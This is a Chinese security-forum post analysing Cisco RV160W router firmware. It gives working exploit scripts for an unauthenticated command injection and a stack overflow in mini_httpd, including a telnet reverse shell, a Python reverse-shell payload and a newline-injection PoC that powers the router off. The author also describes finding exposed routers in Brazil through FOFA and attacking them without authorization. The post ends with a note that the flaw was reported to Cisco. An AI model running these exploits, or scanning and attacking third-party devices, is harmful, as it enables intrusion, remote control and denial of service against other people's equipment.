> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-268758.htm)

> [原创]Cisco RV160W 系列路由器漏洞：从 1day 分析到 0day 挖掘

前言
==

(本文写于几个月前，由于官方没推补丁，就迟迟没发布) 本来只是打算分析思科 RV160W 这款路由器最近的无条件 RCE 漏洞。我 diff 固件查看变动代码，结果有了一些新发现

 

[https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-rv160-260-rce-XZeFkNHf.html](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-rv160-260-rce-XZeFkNHf.html)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_SZPC5MHJ2ECU4ZZ.png)

固件初步分析
======

根据官方的通告，Cisco Small Business RV160、RV160W、RV260、RV260P 和 RV260W VPN 路由器基于 Web 的管理界面中存在多个漏洞，可能允许未经身份验证的远程攻击者以 root 用户身份在受影响的设备上执行任意代码。这些漏洞在固件 v1.0.01.02 版本被修复

 

![](https://bbs.pediy.com/upload/attach/202108/793907_E4SHXXMESQZ6P8B.png)

 

我去 [Cisco Software Center](https://software.cisco.com/download/home/286316464/type/282465789/release/1.0.01.01) 下载了两个版本固件

 

![](https://bbs.pediy.com/upload/attach/202108/793907_AXXR8MF4YAAQTTV.png)

 

版本 v1.0.01.01 就是存在漏洞的固件

 

binwalk 解压固件，寻找提供 web 服务的二进制文件，其实可以根据 rc.d 与 init.d 目录的一些初始化脚本盲猜, 这里本着通用性与研究性的目的用另一种方式寻找。

 

由于手中没有现成设备，firmadyne 有点鸡肋，于是我在油管上找了个 RV160W 的配置教程，观察浏览器上方的 url，根据关键字符 “configurationManagement” 定位到 admin.cgi，进而定位到 web 组件是 mini_httpd(32 位 arm 小端程序)。

 

![](https://bbs.pediy.com/upload/attach/202108/793907_PZ2FKJEC2XV4YT8.png)

```
b0ldfrev@ubuntu:~/blog/v1.0.01.01/rootfs$ grep -Rnl "configurationManagement" * 2>/dev/null
usr/sbin/admin.cgi
usr/lib/opkg/info/sbr-gui.list
www/gettingStarted.htm
www/configurationManagement.htm
www/app.min20200813.js
www/home.htm
b0ldfrev@ubuntu:~/blog/v1.0.01.01/rootfs$ grep -Rnl "admin.cgi" * 2>/dev/null
usr/sbin/mini_httpd
usr/sbin/admin.cgi
usr/lib/opkg/info/sbr-gui.list
b0ldfrev@ubuntu:~/blog/v1.0.01.01/rootfs$ file ./usr/sbin/mini_httpd
./usr/sbin/mini_httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 2.6.16, stripped

```

定位到 web 服务程序后，我们对两个版本固件的 mini_httpd 程序进行二进制代码对比 (当然也有对 admin.cgi 进行对比，也存在不少改动代码，但这次我只关注 mini_httpd 组件部分)

 

最经典的是 [bindiff](https://www.zynamics.com/software.html) 这款工具，但是我用它并没有找到关键代码改动部分

 

![](https://bbs.pediy.com/upload/attach/202108/793907_VHEV826RZ69W2K6.png)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_657EPA544PC6FCP.png)

 

之后又使用了一款 IDA 插件 [diaphora](https://github.com/joxeankoret/diaphora), 导出 sqlite 数据库后进行对比，发现 mini_httpd2 的 sub_1B034 函数（对应 mini_httpd1 的 sub_1AF58 函数）和 sub_15CE4 函数（对应 mini_httpd1 的 sub_15CE4 函数）改动较明显。

 

![](https://bbs.pediy.com/upload/attach/202108/793907_X2FMVF9TND5YWYG.png)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_XF38Q9UQTBAHQVH.png)

 

**分析 sub_1AF58 函数改动部分**

 

分别定位到两个程序相关代码部分

 

mini_httpd1

 

![](https://bbs.pediy.com/upload/attach/202108/793907_BMYNTA84276HWG6.png)

 

mini_httpd2

 

![](https://bbs.pediy.com/upload/attach/202108/793907_J27AQFX2MQS4GX8.png)

 

在新版本的 sub_1B340 中，将格式化后的 v3 作为参数传递给 system，在这之前 v3 经过了一次 sub_1B034 函数

 

sub_1b034 函数是新加入的，里面大概是过滤字符的功能

 

![](https://bbs.pediy.com/upload/attach/202108/793907_SXQ3CJUUJSKMU4F.png)

 

这里已经不能再明显了，system 函数处存在命令注入，于是 mini_httpd2 用过滤危险字符的方式修复了这个漏洞。

 

**分析 sub_15CE4 函数改动部分**

 

mini_httpd1

 

![](https://bbs.pediy.com/upload/attach/202108/793907_P4Y4C8F78KGNXXD.png)

 

mini_httpd2

 

![](https://bbs.pediy.com/upload/attach/202108/793907_6ZQZN977PQ2Q2FZ.png)

 

将 strcpy 函数替换成了 strncpy 函数。断定此处 strcpy 存在栈溢出漏洞。

 

对固件的初步逆向分析后，基本判定老版本固件至少存在命令注入和栈溢出这两个漏洞。

固件模拟
====

模拟 httpd 服务, 为了之后附加进程调试，我选用 qemu 系统模式进行模拟。

 

拷贝 1.0.01.01 固件文件系统进 qemu，挂载一些关键目录后以 chroot 执行 sh.

```
root@debian-armhf:~/rootfs# ls
bin  etc  media  overlay  rom    sbin  test_scripts  usr  www
dev  lib  mnt     proc      root    sys   tmp        var
root@debian-armhf:~/rootfs# mount -t proc  /proc/ ./proc/
root@debian-armhf:~/rootfs# mount -t devtmpfs /dev/ ./dev/
root@debian-armhf:~/rootfs# chroot . ./bin/sh
 
BusyBox v1.23.2 (2020-08-17 10:59:42 IST) built-in shell (ash)
 
/ #

```

在运行 mini_httpd 之前可能需要初始化环境目录，这些往往都在 rc.d 与 init.d 启动脚本里面，所以全局搜索引用 “mini_httpd” 的地方

```
b0ldfrev@ubuntu:~/cve/RV160W/rootfs$ grep -Rnl "mini_httpd" * 2>/dev/null
etc/scripts/mini_httpd/mini_httpd.sh
etc/rc.d/S23mini_httpd.init
etc/init.d/mini_httpd.init
etc/init.d/config_update.sh
usr/sbin/mini_httpd
usr/sbin/admin.cgi
usr/lib/opkg/info/sbr-gui.list

```

发现`etc/scripts/mini_httpd/mini_httpd.sh` 与 `etc/rc.d/S23mini_httpd.init` 与 `etc/init.d/mini_httpd.init` 这些里面的内容都差不多，大概都是初始化一些文件然后最终启动`/usr/sbin/mini_httpd`

```
#!/bin/sh /etc/rc.common
 
START=23
 
version_gt() {
    test "$(echo "$@" | tr " " "\n" | sort -n | head -n 1)" != "$1";
}
get_version() {
    version=`cat $1 | grep "\"VERSION\"" | awk -F '"' '{print $4}'`
    if [[ "${version/V/}" != "$version" ]]; then
        version=`echo $version | awk -F 'V' '{print $2}'`
    fi
    echo $version
}
start() {
    fwLgPath="/www/lang"
    mntLgPath="/mnt/packages/languages"
    mkdir -p /tmp/download
    mkdir -p /tmp/download
    mkdir -p /tmp/download/certificate
    mkdir -p /tmp/download/log
    mkdir -p /tmp/download/configuration
    mkdir -p /tmp/www
    mkdir -p /tmp/portal_img
    if [ ! -d /mnt/packages/languages ]; then
        mkdir -p /mnt/packages/languages
        cp -rf ${fwLgPath}/* ${mntLgPath}
    else
        # check version
        list="English Spanish Frensh German Itailian"
        for i in $list; do
            if [ -f ${fwLgPath}/${i}.js ]; then
                if [ -f ${mntLgPath}/${i}.js ]; then
                    tmp_version=`cat ${mntLgPath}/${i}.js | grep "\"VERSION\"" | awk -F '"' '{print $4}'`
                    fw_version=$(get_version ${fwLgPath}/${i}.js)
                    mnt_version=$(get_version ${mntLgPath}/${i}.js)
                    if [[ "${tmp_version/V/}" != "$tmp_version" ]]; then
                        cp -f ${fwLgPath}/${i}.js ${mntLgPath}/${i}.js
                    elif ! version_gt $mnt_version $fw_version; then
                        cp -f ${fwLgPath}/${i}.js ${mntLgPath}/${i}.js
                    fi
                else
                    cp ${fwLgPath}/${i}.js ${mntLgPath}/${i}.js
                fi
            fi
        done
    fi
 
    /etc/scripts/mini_httpd/mini_httpd.sh start
}
 
stop() {
    /etc/scripts/mini_httpd/mini_httpd.sh stop
}
 
reload() {
    /etc/scripts/mini_httpd/mini_httpd.sh reload
}

```

我试着运行了一个

```
/ # /etc/init.d/mini_httpd.init
uci: Entry not found
Syntax: /etc/init.d/mini_httpd.init [command]
 
Available commands:
    start    Start the service
    stop    Stop the service
    restart    Restart the service
    reload    Reload configuration files (or restart if that fails)
    enable    Enable service autostart
    disable    Disable service autostart
 
/ # /etc/init.d/mini_httpd.init start
uci: Entry not found
ls: /mnt/configcert/confd/startup/: No such file or directory
use backup cert for mini-httpd ...
1 0 0 0
setsockopt SO_REUSEADDR: Protocol not available
setsockopt SO_REUSEADDR: Protocol not available
/usr/sbin/mini_httpd: can't bind to any address
/ #

```

发现报错 can't bind to any address，这个报错在 mini_httpd 程序中，此时一些文件其实已经初始化了，我们可以只关注 mini_httpd 程序本身。

 

我们直接运行 mini_httpd，同样的报错

```
/ # /usr/sbin/mini_httpd
setsockopt SO_REUSEADDR: Protocol not available
setsockopt SO_REUSEADDR: Protocol not available
/usr/sbin/mini_httpd: can't bind to any address

```

错误原因是 setsockopt 函数在调用时协议参数不合法，经过一番尝试后无果；最后想到这种设置套接字属性的函数，其实 hook 掉对连接的影响也不是很大，关键服务能起来就行。

 

定位到程序报错点，是 setsockopt 失败返回负值导致的错误。

 

![](https://bbs.pediy.com/upload/attach/202108/793907_5TWT4SPQ2VUUABR.png)

 

我索性将 setsockopt 函数 hook 全返回 1

```
/*arm-linux-gnueabi-gcc -shared -fPIC hook.c -o hook  */
#include #include #include int setsockopt(int sockfd, int level, int optname,
                      const void *optval, socklen_t optlen)
{
 
return 1;
} 
```

```
BusyBox v1.23.2 (2020-08-17 10:59:42 IST) built-in shell (ash)
 
/ # LD_PRELOAD="/hook" ./usr/sbin/mini_httpd
bind: Address already in use
/ # ./usr/sbin/mini_httpd: started as root without requesting chroot(), warning only
 
/ # ps |grep mini_httpd
 2364 root      3540 S    ./usr/sbin/mini_httpd
 2369 root      3120 S    grep mini_httpd

```

可以看到服务跑起来了，访问试试

 

![](https://bbs.pediy.com/upload/attach/202108/793907_7US2KSD5RCRVFWJ.png)

 

根据 403 字符定位到程序中

 

![](https://bbs.pediy.com/upload/attach/202108/793907_5MF9RSU2BN8MJXG.png)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_JBJ3KAVY6Z29U8A.png)

 

执行 sub_1b5f0 函数后就退出了，猜测是某些环境变量的问题，这里为了不改变代码逻辑，我直接 patch mini_httpd 程序代码块，把跳转 sub_1B5F0 的地方 nop 掉

 

![](https://bbs.pediy.com/upload/attach/202108/793907_DYG3EWZRRY325UJ.png)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_KWYUX2P9WYP3UAF.png)

 

再次执行程序后访问 web

 

![](https://bbs.pediy.com/upload/attach/202108/793907_R3PCFJN2MN2K7CT.png)

固件逆向分析与调试
=========

接下来就是对 mini_httpd 的详细逆向过程，其实就是寻找触发路径。

命令注入漏洞分析
--------

我把漏洞触发函数改成了 vuln，以及调用 vuln 的上层函数 vuln_back1，上上层函数 vuln_back2........

 

![](https://bbs.pediy.com/upload/attach/202108/793907_XQBD3YMRM7KVHMM.png)

#### vuln_back2

在 vuln_back2 中看出，我们只需要 contrl_arg 字符串里面包含`"dniapi/"`即可进入 vuln_back1

 

![](https://bbs.pediy.com/upload/attach/202108/793907_XT8B545MEGRV3QU.png)

 

在往上看，contrl_arg 被赋值成 dword_34F60 + 1，并且 dword_34F60 第一个字符必须为`'/'`, 这里可以猜测 contrl_arg 是一个请求行的 URL

 

![](https://bbs.pediy.com/upload/attach/202108/793907_MS2H2GRGAPP2WTR.png)

 

为了验证我的猜测，动态调试一下，由于所有的请求都被放在了 fork 子进程中处理。我这里暂时为了方便调试，hook 了 fork 函数返回 0，构造了`GET /hello.txt`

 

![](https://bbs.pediy.com/upload/attach/202108/793907_GDENSCCMFN92XJV.png)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_5HHUM9TWQ3H2YBM.png)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_2B97Q8ZST39PQPU.png)

#### vuln_back1

在 vuln_back1 中判断了 contrl_arg 是否是相关字符，不是就会去执行 vuln，调用 vuln 时传入了 contrl_arg 这个参数

 

![](https://bbs.pediy.com/upload/attach/202108/793907_NQS9AGD62F298SF.png)

#### vuln

vuln 函数里面还有最后一层判断，必须让 contrl_arg 的前 9 个字符等于`"download/"`

 

![](https://bbs.pediy.com/upload/attach/202108/793907_A69T4PVGGS6TY9G.png)

 

所以综上，我们可以构造 GET 请求 URL 为 "/download/dniapi/"，为了能触发 system 函数，我还需要调整 contrl_cmd 的值为`"Basic "`

 

查找引用，发现在 vuln_back2 函数中给 contrl_cmd 赋值

 

![](https://bbs.pediy.com/upload/attach/202108/793907_6F8ZXH4ETPXT8WA.png)

 

大胆猜测，这里就是 HTTP 的 head 的 Authorization 字段

 

综上，最终能触发到 system 函数的请求大致如下 (当然实际还需添加一些标准 head)

```
GET /download/dniapi/ HTTP/1.1
Authorization: Basic xxxxxxxxxxxxxxxxxxxxxxxxx

```

vuln 通过 sub_1E19C 函数处理`contrl_cmd + 6`（`Basic`之后的字符串），结果放入 v5，最终将 v5 作为拼接命令的一部分。

 

![](https://bbs.pediy.com/upload/attach/202108/793907_YE9AMW5Q4E5W87G.png)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_4SBH57FFKAGAY7S.png)

 

3 字节一组，以及明显的 base64 解码字符表，经验证 sub_1E19C 就是 base64 解密函数。

 

所以只需要将请求`Authorization: Basic`后的字符换成想要执行命令的 base64 编码形式，同时用`;`字符截断原有的 curl 命令，就可以执行任意命令，下面以 date 命令为例。

 

![](https://bbs.pediy.com/upload/attach/202108/793907_8RAWTT98WV249U3.png)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_VFR72653MQXVM63.png)

栈溢出漏洞分析
-------

同样我将漏洞触发函数重命名成 overflow, 上层函数 overflow_back1、overflow_back2

 

在 vuln_back2 函数里，处理 cookie 并且作为参数传入 overflow_back2 函数。

 

![](https://bbs.pediy.com/upload/attach/202108/793907_453VZPBDGCTB7AN.png)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_7JSHUKAWT5CZ9WQ.png)

 

在这之前会有一个 check，检查当前请求的 url 资源内容是否是需要登录才能访问

 

![](https://bbs.pediy.com/upload/attach/202108/793907_CUB4BTCMHRC6TTA.png)

 

所以这里需要请求这些资源，使其返回 1。

 

![](https://bbs.pediy.com/upload/attach/202108/793907_64U3WRWYFPPB5BJ.png)

 

overflow_back2 里判断 cookie 不为空后进入 overflow_back1

 

![](https://bbs.pediy.com/upload/attach/202108/793907_N8MUJCWW5V46F2T.png)

 

然后就是检索 cookie 是否包含 sessionID，包含的话，将其以空格分隔后，传入 overflow 函数

 

![](https://bbs.pediy.com/upload/attach/202108/793907_BXATSZ9JD4ATFUC.png)

 

overflow 函数中形参 a2 指向空字符，所以其实最后就是未限制 sessionID 长度在 strcpy 时的溢出。

 

![](https://bbs.pediy.com/upload/attach/202108/793907_FFNRJVEJVPREB4X.png)

 

POC 如下：

```
from pwn import *
import requests
import urllib3
import sys
 
url = sys.argv[1]
 
if url[-1:]=='/':
   url=url[:-1]
 
cmd="aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac"
 
payload = "sessionID="+cmd
 
urllib3.disable_warnings()
 
url= url+"/help"
head= {'Cookie':payload}
r=requests.get(url,headers=head,verify=False)
 
print(r)
print(r.text)
print(r.content)

```

![](https://bbs.pediy.com/upload/attach/202108/793907_WEAH89B8WJGGTSJ.png)

 

分析 crash 结果，得知是在 overflow 函数返回前抛出的内存引用异常。原因是数据过长，覆盖了上一个栈帧的变量，导致最后一个 strcpy 往上一个栈帧 a5 变量地址写数据时，该地址不合法。

 

所以为了能够保证利用，需要刚好覆盖到 overflow 函数的返回地址。

 

经过调试，测得偏移为 268,POC 如下：

```
from pwn import *
import requests
import urllib3
import sys
 
url = sys.argv[1]
 
if url[-1:]=='/':
   url=url[:-1]
 
payload = "sessionID=1234".ljust(268,"a")
 
urllib3.disable_warnings()
 
url= url+"/help"
head= {'Cookie':payload}
r=requests.get(url,headers=head,verify=False)
 
print(r)
print(r.text)
print(r.content)

```

![](https://bbs.pediy.com/upload/attach/202108/793907_A2HJVFDVNWYK52R.png)

 

payload 末位被置零，返回地址 0x161DC 被替换成 0x16100，且可以观察到此时的 r0 寄存器指向 sessionID = 后的字符串 1234，因此可以在 sessionID = 后放置命令字符串，然后控制 PC 跳转到 system 函数上。由于 cookie 在 overflow_back1 函数中被过滤了空格，在 overflow 中被过滤了等号，导致命令执行受限，空格可以用 ${IFS} 替换，等号只能避免使用了。

 

![](https://bbs.pediy.com/upload/attach/202108/793907_P546WWX8XGJ6K44.png)

Command Inject EXP
==================

```
import requests
import sys
import base64
import urllib3
 
if len(sys.argv)!=3:
    print "Parameter error. python exp.py url \"command\""
    exit(0)
 
url = sys.argv[1]
cmd =  sys.argv[2]
 
CMD=";"+cmd+";"
CMD=base64.b64encode(CMD)
 
header = {'Authorization':"Basic "+CMD}
 
urllib3.disable_warnings()
 
if url[-1:]=='/':
   url=url[:-1]
r = requests.get(url+"/download/dniapi/", headers=header,verify=False)
 
print "DONE!"

```

Stack Overflow EXP
==================

关于 system 执行命令，我并不想去另寻僻径去 ROP 或者是上传后门程序，我尝试了很多技巧，最终以这种较为简单且通用的方式弹 shell（输入与输出分离）。

```
import requests
import urllib3
import sys
 
 
if len(sys.argv)!=5:
    print "Parameter error. python exp.py url reverse_shell_host input_port output_port"
    exit(0)
 
 
url = sys.argv[1]
reverse_shell_host =  sys.argv[2]
input_port= sys.argv[3]
output_port= sys.argv[4]
 
 
if url[-1:]=='/':
   url=url[:-1]
 
 
cmd="telnet "+reverse_shell_host+" "+input_port+" | /bin/sh | telnet "+reverse_shell_host+" "+output_port
 
cmd2=cmd.replace(' ',"${IFS}")
 
 
payload = ("sessionID="+cmd2+";").ljust(268,"a")
payload += "\x1c\xb1\x01"
 
 
urllib3.disable_warnings()
 
url= url+"/help"
head= {'Cookie':payload}
r=requests.post(url,headers=head,verify=False)
 
print(r)
print(r.text)
print(r.content)

```

本地测试
====

以 Command Inject EXP 为例：

```
python exp.py http://192.168.122.12 "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.122.11\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

```

![](https://bbs.pediy.com/upload/attach/202108/793907_2N6ZX9PSPM6XXNB.png)

真实设备测试
======

由于我手里没有真实设备, 只能找一些公网上的设备验证。

 

用 burpsuit 抓包获取设备特征

 

![](https://bbs.pediy.com/upload/attach/202108/793907_FNWHR3QMJ96WGE9.png)

 

`Content-Security-Policy:`是一个很明显的特征

 

在 fofa 上搜索 `header="frame-ancestors 'self' 'unsafe-inline' 'unsafe-eval'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline' 'unsafe-eval'"`

 

我这里只搜索了巴西的

 

![](https://bbs.pediy.com/upload/attach/202108/793907_Y57VZTAV5YZ2HPZ.png)

 

用 exp 打来试试

 

![](https://bbs.pediy.com/upload/attach/202108/793907_ZGKV8SGN6U2XC2F.png)

收获 0day
=======

一开始我补丁比较的时候就发现，v1.0.01.02 固件在 sprintf 之前加入了字符过滤函数  
![](https://bbs.pediy.com/upload/attach/202108/793907_J27AQFX2MQS4GX8.png)

 

该函数完整代码如下

```
_BYTE *__fastcall filer(_BYTE *output, _BYTE *input, int a3_1024)
{
  _BYTE *v3; // r3
  _BYTE *v4; // r3
  _BYTE *v5; // r3
  _BYTE *v6; // r3
  _BYTE *v7; // r3
  _BYTE *v8; // r2
  int v9; // [sp+10h] [bp-14h]
  _BYTE *v10; // [sp+14h] [bp-10h]
  int v12; // [sp+1Ch] [bp-8h]
  int v13; // [sp+1Ch] [bp-8h]
  int v14; // [sp+1Ch] [bp-8h]
 
  v12 = 0;
  v9 = a3_1024 - 1;
  v10 = output;
  while ( *input )
  {
    if ( *input == '~'
      || *input == '`'
      || *input == '#'
      || *input == '$'
      || *input == '&'
      || *input == '*'
      || *input == '('
      || *input == ')'
      || *input == '|'
      || *input == '['
      || *input == ']'
      || *input == '{'
      || *input == '}'
      || *input == ';'
      || *input == '\''
      || *input == '"'
      || *input == '<'
      || *input == '>'
      || *input == '/'
      || *input == '?'
      || *input == '!'
      || *input == ' '
      || *input == '='
      || *input == '\t' )
    {
      v3 = v10++;
      *v3 = '\\';
      if ( ++v12 >= v9 )
        break;
    }
    else if ( *input == '\\' )
    {
      v4 = v10++;
      *v4 = '\\';
      v13 = v12 + 1;
      if ( v13 >= v9 )
        break;
      v5 = v10++;
      *v5 = '\\';
      v14 = v13 + 1;
      if ( v14 >= v9 )
        break;
      v6 = v10++;
      *v6 = '\\';
      v12 = v14 + 1;
      if ( v12 >= v9 )
        break;
    }
    v7 = v10++;
    v8 = input++;
    *v7 = *v8;
    if ( ++v12 >= v9 )
      break;
  }
  *v10 = 0;
  return output;
}

```

经分析，它的功能主要是检索字符串，一旦检测到敏感字符，就将在该字符前面加上一个转义符`"\"`

 

比如我们构造命令`ls -all`, 被它处理后字符变成了`ls\ -all`

 

我试了各种方法，都无法绕过

 

但是我发现它并没有过滤换行符`"\n"`，这可以让我们使用换行符截断命令，但是我们只能执行一些环境变量目录下的程序，并且还不能跟参数，可能的用处是开启一些对外的接口比如 telnetd 或其它。

 

但这也是一个很严重的过滤缺陷，因为我们可以构造`"\npoweroff\n"`来使路由器关机，这直接是拒绝服务攻击了

 

![](https://bbs.pediy.com/upload/attach/202108/793907_P6K3BC9UGTARQU2.png)

#### POC

执行其他命令可根据上面 Command Inject EXP 代码，将字符拼接处的; 换成 \ n。下面只是 poweroff 命令注入。

```
curl -i -s -k  -X $'GET' \
    -H $'Host: 127.0.0.1' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: local_lang=%22English%22; ru=0' -H $'Authorization: Basic CnBvd2Vyb2ZmCg==' -H $'Upgrade-Insecure-Requests: 1' -H $'If-Modified-Since: Wed, 07 Apr 2021 11:28:48 GMT' -H $'Cache-Control: max-age=0' \
    -b $'local_lang=%22English%22; ru=0' \
    $'https://127.0.0.1/download/dniapi/'

```

在公网上找了个用 1day 打 getshell 失败 但使用 POC 成功宕机的

 

![](https://bbs.pediy.com/upload/attach/202108/793907_YFNT8N7J6PT3GK5.png)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_SCPTMY9K64ZPEH2.png)

 

![](https://bbs.pediy.com/upload/attach/202108/793907_5PKF499WMZESV2R.png)

Notices
=======

目前该漏洞已经提交给了思科厂商，思科已确认了该漏洞并修复。[https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-rv-code-execution-9UVJr7k4.html](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-rv-code-execution-9UVJr7k4.html)  
![](https://bbs.pediy.com/upload/attach/202108/793907_AZEQW2YDS8FD9VK.png)

[[注意] 招人！base 上海，课程运营、市场多个坑位等你投递！](https://bbs.pediy.com/thread-267474.htm)

最后于 14 分钟前 被 b0ldfrev 编辑 ，原因：

[#固件分析](forum-128-1-170.htm) [#漏洞分析](forum-128-1-171.htm) [#漏洞挖掘](forum-128-1-178.htm) [#家用设备](forum-128-1-173.htm)

上传的附件：

*   [mini_httpd.idb.zip](javascript:void(0)) （371.90kb，0 次下载）